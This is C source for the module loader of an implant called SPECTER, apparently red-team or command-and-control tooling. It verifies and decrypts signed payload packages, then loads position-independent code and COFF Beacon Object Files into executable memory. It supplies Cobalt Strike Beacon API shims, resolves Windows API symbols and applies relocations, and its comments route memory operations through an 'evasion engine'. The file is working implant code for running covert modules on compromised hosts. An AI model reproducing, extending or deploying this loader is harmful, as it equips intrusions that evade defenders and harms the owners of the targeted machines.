/**
 * SPECTER Implant — Module Loader
 *
 * Handles the full module loading pipeline:
 *   1. Verify Ed25519 signature over encrypted payload
 *   2. Decrypt via X25519 key agreement + ChaCha20-Poly1305
 *   3. Load PIC blobs or COFF objects into executable memory
 *   4. Resolve COFF external symbols against bus API / Beacon shims
 *   5. Process COFF relocations (ADDR64, ADDR32NB, REL32 family)
 *
 * All memory operations route through the evasion engine via the bus.
 */

#include "specter.h"
#include "ntdefs.h"
#include "crypto.h"
#include "bus.h"
#include "beacon.h"

/* ------------------------------------------------------------------ */
/*  Beacon API shim names — for COFF BOF compatibility                 */
/* ------------------------------------------------------------------ */

/**
 * Well-known Beacon API function names that COFF BOFs may reference.
 * We map these to equivalent bus API function pointers.
 */

typedef struct _SYMBOL_MAP_ENTRY {
    const char *name;
    PVOID       address;
} SYMBOL_MAP_ENTRY;

/* Forward declaration — populated at load time from bus API */
static SYMBOL_MAP_ENTRY *build_symbol_map(MODULE_BUS_API *api, DWORD *count_out);

/* ------------------------------------------------------------------ */
/*  loader_parse_header                                                */
/* ------------------------------------------------------------------ */

const MODULE_PACKAGE_HDR *loader_parse_header(const BYTE *package,
                                               DWORD package_len) {
    if (!package || package_len < sizeof(MODULE_PACKAGE_HDR))
        return NULL;

    const MODULE_PACKAGE_HDR *hdr = (const MODULE_PACKAGE_HDR *)package;

    /* Validate magic */
    if (hdr->magic != MODULE_MAGIC)
        return NULL;

    /* Validate version */
    if (hdr->version != MODULE_VERSION)
        return NULL;

    /* Validate module type */
    if (hdr->module_type != MODULE_TYPE_PIC &&
        hdr->module_type != MODULE_TYPE_COFF)
        return NULL;

    /* Validate encrypted_size vs actual package length */
    if (hdr->encrypted_size == 0 ||
        hdr->encrypted_size > MODULE_MAX_SIZE)
        return NULL;

    DWORD expected_len = sizeof(MODULE_PACKAGE_HDR) + hdr->encrypted_size;
    if (package_len < expected_len)
        return NULL;

    return hdr;
}

/* ------------------------------------------------------------------ */
/*  loader_verify_package — Ed25519 signature verification             */
/* ------------------------------------------------------------------ */

BOOL loader_verify_package(const BYTE *package, DWORD package_len,
                           const BYTE signing_key[32]) {
    if (!package || !signing_key)
        return FALSE;

    const MODULE_PACKAGE_HDR *hdr = loader_parse_header(package, package_len);
    if (!hdr)
        return FALSE;

    /* The signature covers the encrypted module data (after the header) */
    const BYTE *encrypted_data = package + sizeof(MODULE_PACKAGE_HDR);
    DWORD encrypted_len = hdr->encrypted_size;

    /* Verify Ed25519 signature */
    return spec_ed25519_verify(signing_key, encrypted_data, encrypted_len,
                               hdr->signature);
}

/* ------------------------------------------------------------------ */
/*  loader_decrypt_package — X25519 + ChaCha20-Poly1305                */
/* ------------------------------------------------------------------ */

BOOL loader_decrypt_package(const BYTE *package, DWORD package_len,
                            const BYTE implant_privkey[32],
                            BYTE *plaintext_out, DWORD *plaintext_len) {
    if (!package || !implant_privkey || !plaintext_out || !plaintext_len)
        return FALSE;

    const MODULE_PACKAGE_HDR *hdr = loader_parse_header(package, package_len);
    if (!hdr)
        return FALSE;

    /*
     * Encrypted payload layout:
     *   [12B nonce][ciphertext][16B Poly1305 tag]
     * Total encrypted_size = 12 + ciphertext_len + 16
     */
    DWORD encrypted_size = hdr->encrypted_size;
    if (encrypted_size < AEAD_NONCE_SIZE + AEAD_TAG_SIZE + 1)
        return FALSE;

    const BYTE *encrypted_data = package + sizeof(MODULE_PACKAGE_HDR);
    const BYTE *nonce = encrypted_data;
    DWORD ct_len = encrypted_size - AEAD_NONCE_SIZE - AEAD_TAG_SIZE;
    const BYTE *ciphertext = encrypted_data + AEAD_NONCE_SIZE;
    const BYTE *tag = encrypted_data + AEAD_NONCE_SIZE + ct_len;

    /* Check output buffer size */
    if (*plaintext_len < ct_len) {
        *plaintext_len = ct_len;
        return FALSE;
    }

    /* X25519 key agreement: shared = scalarmult(implant_priv, ephemeral_pub) */
    BYTE shared_secret[32];
    spec_x25519_scalarmult(shared_secret, implant_privkey,
                           hdr->ephemeral_pubkey);

    /* Derive per-module encryption key via HKDF-SHA256 */
    BYTE derived_key[32];
    const BYTE hkdf_salt[] = "SPECTER-MODULE";
    const BYTE hkdf_info[] = "module-decrypt";
    spec_hkdf_derive(hkdf_salt, sizeof(hkdf_salt) - 1,
                     shared_secret, 32,
                     hkdf_info, sizeof(hkdf_info) - 1,
                     derived_key, 32);

    /* Zero the shared secret immediately */
    spec_memset(shared_secret, 0, 32);

    /* Decrypt with ChaCha20-Poly1305 AEAD (AAD = header up to signature) */
    const BYTE *aad = package;
    DWORD aad_len = (DWORD)((ULONG_PTR)&hdr->signature - (ULONG_PTR)package);

    BOOL result = spec_aead_decrypt(derived_key, nonce,
                                    ciphertext, ct_len,
                                    aad, aad_len,
                                    plaintext_out, tag);

    /* Zero the derived key */
    spec_memset(derived_key, 0, 32);

    if (result) {
        *plaintext_len = ct_len;
    }

    return result;
}

/* ------------------------------------------------------------------ */
/*  loader_load_pic — load position-independent code blob              */
/* ------------------------------------------------------------------ */

PVOID loader_load_pic(const BYTE *blob, DWORD blob_len,
                      MODULE_BUS_API *api, LOADED_MODULE *mod) {
    if (!blob || blob_len == 0 || !api || !mod)
        return NULL;

    /*
     * PIC convention: first 8 bytes of the blob contain a pointer slot
     * that we fill with the MODULE_BUS_API address. The actual entry
     * point is at offset 8 (after the API pointer).
     *
     * Layout in memory:
     *   [0..7]   = MODULE_BUS_API *api  (injected by loader)
     *   [8..]    = PIC code (entry point)
     */
    if (blob_len < 16)
        return NULL;

    /* Allocate RW memory via bus */
    SIZE_T alloc_size = (SIZE_T)blob_len;
    /* Round up to page boundary */
    alloc_size = (alloc_size + 0xFFF) & ~(SIZE_T)0xFFF;

    PVOID mem = api->mem_alloc(alloc_size, PAGE_READWRITE);
    if (!mem)
        return NULL;

    /* Copy blob to allocated memory */
    spec_memcpy(mem, blob, blob_len);

    /* Inject API table pointer at offset 0 */
    *(QWORD *)mem = (QWORD)(ULONG_PTR)api;

    /* Flip memory to RX (read-execute) */
    if (!api->mem_protect(mem, alloc_size, PAGE_EXECUTE_READ)) {
        api->mem_free(mem);
        return NULL;
    }

    /* Fill loaded module structure */
    mod->memory_base = mem;
    mod->memory_size = alloc_size;
    mod->entry_point = (PVOID)((BYTE *)mem + 8);
    mod->module_type = MODULE_TYPE_PIC;
    mod->status = MODULE_STATUS_LOADING;

    return mod->entry_point;
}

/* ------------------------------------------------------------------ */
/*  COFF helper: get symbol name from symbol table                     */
/* ------------------------------------------------------------------ */

static const char *coff_get_symbol_name(const COFF_SYMBOL *sym,
                                         const BYTE *string_table) {
    if (sym->Name.LongName.Zeroes != 0) {
        /* Short name (inline, up to 8 chars) */
        return (const char *)sym->Name.ShortName;
    }
    /* Long name — offset into string table */
    if (!string_table)
        return NULL;
    return (const char *)(string_table + sym->Name.LongName.Offset);
}

/* ------------------------------------------------------------------ */
/*  COFF helper: match symbol name (up to 8 chars for short names)     */
/* ------------------------------------------------------------------ */

static BOOL coff_name_match(const char *sym_name, const char *target) {
    if (!sym_name || !target)
        return FALSE;

    /* For short names, compare up to 8 chars */
    DWORD i = 0;
    while (sym_name[i] && target[i] && i < 256) {
        if (sym_name[i] != target[i])
            return FALSE;
        i++;
    }
    /* Both must be at the same termination point */
    return (sym_name[i] == target[i]) ||
           (i == 8 && target[i] == '\0');  /* Short name exactly 8 chars */
}

/* ------------------------------------------------------------------ */
/*  COFF helper: resolve section protection flags                      */
/* ------------------------------------------------------------------ */

static DWORD coff_section_protect(DWORD characteristics) {
    BOOL exec  = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    BOOL write = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;
    BOOL read  = (characteristics & IMAGE_SCN_MEM_READ) != 0;

    if (exec && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)  return PAGE_EXECUTE_READ;
    if (exec)          return PAGE_EXECUTE;
    if (write)         return PAGE_READWRITE;
    if (read)          return PAGE_READONLY;
    return PAGE_READWRITE; /* Default */
}

/* ------------------------------------------------------------------ */
/*  Beacon API shim symbol map                                         */
/* ------------------------------------------------------------------ */

/**
 * Build symbol map for resolving Beacon/BOF API calls.
 * Maps well-known Beacon function names to bus API equivalents.
 */

/* Static storage for symbol map entries (Beacon shim + bus API) */
static SYMBOL_MAP_ENTRY g_symbol_map[64];

static SYMBOL_MAP_ENTRY *build_symbol_map(MODULE_BUS_API *api, DWORD *count_out) {
    DWORD n = 0;

    /*
     * Initialize the beacon shim with the current module's bus API.
     * This must happen before we return shim function pointers.
     */
    beacon_shim_init(api);

    /*
     * Import all Beacon API shim entries (BeaconOutput, BeaconPrintf,
     * BeaconDataParse, BeaconFormatAlloc, etc.).  These are proper
     * adapter functions with correct Cobalt Strike API signatures.
     */
    DWORD beacon_count = 0;
    BEACON_API_ENTRY *beacon_table = beacon_shim_get_table(&beacon_count);

    for (DWORD i = 0; i < beacon_count && n < 64; i++) {
        g_symbol_map[n].name    = beacon_table[i].name;
        g_symbol_map[n].address = beacon_table[i].address;
        n++;
    }

    /* Direct bus API names for SPECTER-native modules / BOFs */
    g_symbol_map[n].name = "spec_output";
    g_symbol_map[n].address = (PVOID)api->output;
    n++;

    g_symbol_map[n].name = "spec_resolve";
    g_symbol_map[n].address = (PVOID)api->resolve;
    n++;

    g_symbol_map[n].name = "spec_log";
    g_symbol_map[n].address = (PVOID)api->log;
    n++;

    g_symbol_map[n].name = "spec_mem_alloc";
    g_symbol_map[n].address = (PVOID)api->mem_alloc;
    n++;

    g_symbol_map[n].name = "spec_mem_free";
    g_symbol_map[n].address = (PVOID)api->mem_free;
    n++;

    *count_out = n;
    return g_symbol_map;
}

/* ------------------------------------------------------------------ */
/*  COFF helper: resolve external symbol address                       */
/* ------------------------------------------------------------------ */

static PVOID coff_resolve_external(const char *name,
                                    SYMBOL_MAP_ENTRY *sym_map,
                                    DWORD sym_count,
                                    MODULE_BUS_API *api) {
    if (!name)
        return NULL;

    /* Skip leading underscore (MSVC/MinGW decoration) */
    const char *lookup = name;
    if (lookup[0] == '_')
        lookup++;

    /* Check symbol map first */
    for (DWORD i = 0; i < sym_count; i++) {
        if (coff_name_match(lookup, sym_map[i].name))
            return sym_map[i].address;
    }

    /* Try DLL!Function format: "kernel32$FunctionName" */
    const char *dollar = NULL;
    for (const char *p = name; *p; p++) {
        if (*p == '$') {
            dollar = p;
            break;
        }
    }

    if (dollar) {
        /* Split into DLL and function names */
        char dll_name[128];
        char func_name[128];

        DWORD dll_len = (DWORD)(dollar - name);
        if (dll_len >= sizeof(dll_name))
            return NULL;

        spec_memcpy(dll_name, name, dll_len);
        dll_name[dll_len] = '\0';

        /* Append ".dll" if not present */
        DWORD has_dll = 0;
        if (dll_len > 4) {
            if (dll_name[dll_len-4] == '.' &&
                (dll_name[dll_len-3] == 'd' || dll_name[dll_len-3] == 'D') &&
                (dll_name[dll_len-2] == 'l' || dll_name[dll_len-2] == 'L') &&
                (dll_name[dll_len-1] == 'l' || dll_name[dll_len-1] == 'L'))
                has_dll = 1;
        }
        if (!has_dll && dll_len + 4 < sizeof(dll_name)) {
            spec_strcat(dll_name, ".dll");
        }

        DWORD func_len = (DWORD)spec_strlen(dollar + 1);
        if (func_len >= sizeof(func_name))
            return NULL;
        spec_strcpy(func_name, dollar + 1);

        /* Resolve via bus API */
        return api->resolve(dll_name, func_name);
    }

    return NULL;
}

/* ------------------------------------------------------------------ */
/*  loader_load_coff — load COFF object file                           */
/* ------------------------------------------------------------------ */

PVOID loader_load_coff(const BYTE *coff_data, DWORD coff_len,
                       MODULE_BUS_API *api, LOADED_MODULE *mod) {
    if (!coff_data || coff_len < sizeof(COFF_FILE_HEADER) || !api || !mod)
        return NULL;

    /* Parse COFF file header */
    const COFF_FILE_HEADER *file_hdr = (const COFF_FILE_HEADER *)coff_data;

    /* Validate machine type */
    if (file_hdr->Machine != IMAGE_FILE_MACHINE_AMD64)
        return NULL;

    if (file_hdr->NumberOfSections == 0 ||
        file_hdr->NumberOfSections > COFF_MAX_SECTIONS)
        return NULL;

    /* Section headers follow the file header + optional header */
    SIZE_T sections_offset = (SIZE_T)sizeof(COFF_FILE_HEADER) + file_hdr->SizeOfOptionalHeader;
    if (sections_offset + (SIZE_T)file_hdr->NumberOfSections * sizeof(COFF_SECTION) > (SIZE_T)coff_len)
        return NULL;

    const COFF_SECTION *sections = (const COFF_SECTION *)(coff_data + sections_offset);

    /* Symbol table */
    const COFF_SYMBOL *symbols = NULL;
    const BYTE *string_table = NULL;
    DWORD num_symbols = file_hdr->NumberOfSymbols;

    if (file_hdr->PointerToSymbolTable != 0 && num_symbols > 0) {
        DWORD sym_offset = file_hdr->PointerToSymbolTable;
        if (sym_offset + num_symbols * sizeof(COFF_SYMBOL) > coff_len)
            return NULL;
        symbols = (const COFF_SYMBOL *)(coff_data + sym_offset);

        /* String table starts immediately after symbol table */
        DWORD strtab_offset = sym_offset + num_symbols * sizeof(COFF_SYMBOL);
        if (strtab_offset + 4 <= coff_len) {
            string_table = coff_data + strtab_offset;
        }
    }

    /* Calculate total memory needed for all sections */
    SIZE_T total_size = 0;
    for (WORD i = 0; i < file_hdr->NumberOfSections; i++) {
        SIZE_T sec_size = sections[i].SizeOfRawData;
        if (sections[i].VirtualSize > sec_size)
            sec_size = sections[i].VirtualSize;
        /* Align each section to 16 bytes */
        sec_size = (sec_size + 15) & ~(SIZE_T)15;
        /* Guard against integer overflow */
        if (total_size > (SIZE_T)-1 - sec_size)
            return NULL;
        total_size += sec_size;
    }

    if (total_size == 0)
        return NULL;

    /* Page-align total allocation */
    total_size = (total_size + 0xFFF) & ~(SIZE_T)0xFFF;

    /* Allocate RWX memory for sections (will set proper protection later) */
    PVOID mem_base = api->mem_alloc(total_size, PAGE_READWRITE);
    if (!mem_base)
        return NULL;

    spec_memset(mem_base, 0, total_size);

    /* Map section data and track offsets */
    SIZE_T section_offsets[COFF_MAX_SECTIONS];
    SIZE_T current_offset = 0;

    for (WORD i = 0; i < file_hdr->NumberOfSections; i++) {
        section_offsets[i] = current_offset;

        if (sections[i].SizeOfRawData > 0 &&
            sections[i].PointerToRawData + sections[i].SizeOfRawData <= coff_len) {
            spec_memcpy((BYTE *)mem_base + current_offset,
                        coff_data + sections[i].PointerToRawData,
                        sections[i].SizeOfRawData);
        }

        SIZE_T sec_size = sections[i].SizeOfRawData;
        if (sections[i].VirtualSize > sec_size)
            sec_size = sections[i].VirtualSize;
        sec_size = (sec_size + 15) & ~(SIZE_T)15;
        current_offset += sec_size;
    }

    /* Build symbol resolution table */
    DWORD sym_map_count = 0;
    SYMBOL_MAP_ENTRY *sym_map = build_symbol_map(api, &sym_map_count);

    /* Resolve symbol addresses */
    PVOID resolved_symbols[COFF_MAX_SYMBOLS];
    spec_memset(resolved_symbols, 0, sizeof(resolved_symbols));

    PVOID entry_point = NULL;

    if (symbols && num_symbols <= COFF_MAX_SYMBOLS) {
        for (DWORD i = 0; i < num_symbols; i++) {
            const COFF_SYMBOL *sym = &symbols[i];

            if (sym->SectionNumber > 0 &&
                sym->SectionNumber <= file_hdr->NumberOfSections) {
                /* Symbol is in a section — compute address */
                WORD sec_idx = (WORD)(sym->SectionNumber - 1);
                resolved_symbols[i] = (BYTE *)mem_base +
                                      section_offsets[sec_idx] +
                                      sym->Value;

                /* Check if this is the entry point ("go" or "_go") */
                const char *name = coff_get_symbol_name(sym, string_table);
                if (name) {
                    if (coff_name_match(name, "go") ||
                        coff_name_match(name, "_go")) {
                        entry_point = resolved_symbols[i];
                    }
                }
            } else if (sym->SectionNumber == IMAGE_SYM_UNDEFINED &&
                       sym->StorageClass == IMAGE_SYM_CLASS_EXTERNAL) {
                /* External symbol — resolve via symbol map / bus API */
                const char *name = coff_get_symbol_name(sym, string_table);
                if (name) {
                    resolved_symbols[i] = coff_resolve_external(name, sym_map,
                                                                 sym_map_count, api);
                }
            }

            /* Skip auxiliary symbol entries */
            i += sym->NumberOfAuxSymbols;
        }
    }

    /* Process relocations for each section */
    for (WORD i = 0; i < file_hdr->NumberOfSections; i++) {
        if (sections[i].NumberOfRelocations == 0 ||
            sections[i].PointerToRelocations == 0)
            continue;

        DWORD reloc_offset = sections[i].PointerToRelocations;
        DWORD reloc_count = sections[i].NumberOfRelocations;

        if (reloc_offset + reloc_count * sizeof(COFF_RELOCATION) > coff_len)
            continue;

        const COFF_RELOCATION *relocs =
            (const COFF_RELOCATION *)(coff_data + reloc_offset);

        BYTE *sec_base = (BYTE *)mem_base + section_offsets[i];

        for (DWORD r = 0; r < reloc_count; r++) {
            const COFF_RELOCATION *rel = &relocs[r];

            if (rel->SymbolTableIndex >= num_symbols ||
                rel->SymbolTableIndex >= COFF_MAX_SYMBOLS)
                continue;

            PVOID sym_addr = resolved_symbols[rel->SymbolTableIndex];
            if (!sym_addr)
                continue;

            BYTE *fixup = sec_base + rel->VirtualAddress;

            /* Bounds check: ensure fixup is within our allocation */
            if ((ULONG_PTR)fixup < (ULONG_PTR)mem_base ||
                (ULONG_PTR)fixup >= (ULONG_PTR)mem_base + total_size)
                continue;

            switch (rel->Type) {
            case IMAGE_REL_AMD64_ADDR64: {
                /* 64-bit absolute address */
                QWORD target = (QWORD)(ULONG_PTR)sym_addr;
                spec_memcpy(fixup, &target, sizeof(QWORD));
                break;
            }

            case IMAGE_REL_AMD64_ADDR32NB: {
                /* 32-bit relative to image base (we use 0 as base) */
                LONG delta = (LONG)((ULONG_PTR)sym_addr - (ULONG_PTR)mem_base);
                spec_memcpy(fixup, &delta, sizeof(LONG));
                break;
            }

            case IMAGE_REL_AMD64_REL32:
            case IMAGE_REL_AMD64_REL32_1:
            case IMAGE_REL_AMD64_REL32_2:
            case IMAGE_REL_AMD64_REL32_3:
            case IMAGE_REL_AMD64_REL32_4:
            case IMAGE_REL_AMD64_REL32_5: {
                /*
                 * RIP-relative: target - (fixup + 4 + extra)
                 * REL32 = 0 extra, REL32_1 = 1, ..., REL32_5 = 5
                 */
                DWORD extra = rel->Type - IMAGE_REL_AMD64_REL32;
                LONG delta = (LONG)((ULONG_PTR)sym_addr -
                                    ((ULONG_PTR)fixup + 4 + extra));
                spec_memcpy(fixup, &delta, sizeof(LONG));
                break;
            }

            case IMAGE_REL_AMD64_ABSOLUTE:
                /* No fixup needed */
                break;

            default:
                /* Unsupported relocation type — skip */
                break;
            }
        }
    }

    /* Set proper memory protection for each section */
    for (WORD i = 0; i < file_hdr->NumberOfSections; i++) {
        SIZE_T sec_size = sections[i].SizeOfRawData;
        if (sections[i].VirtualSize > sec_size)
            sec_size = sections[i].VirtualSize;
        sec_size = (sec_size + 15) & ~(SIZE_T)15;

        if (sec_size == 0)
            continue;

        DWORD prot = coff_section_protect(sections[i].Characteristics);
        BYTE *sec_base = (BYTE *)mem_base + section_offsets[i];
        api->mem_protect(sec_base, sec_size, prot);
    }

    /* If no entry point found, clean up and fail */
    if (!entry_point) {
        api->mem_free(mem_base);
        return NULL;
    }

    /* Fill loaded module structure */
    mod->memory_base = mem_base;
    mod->memory_size = total_size;
    mod->entry_point = entry_point;
    mod->module_type = MODULE_TYPE_COFF;
    mod->status = MODULE_STATUS_LOADING;

    return entry_point;
}
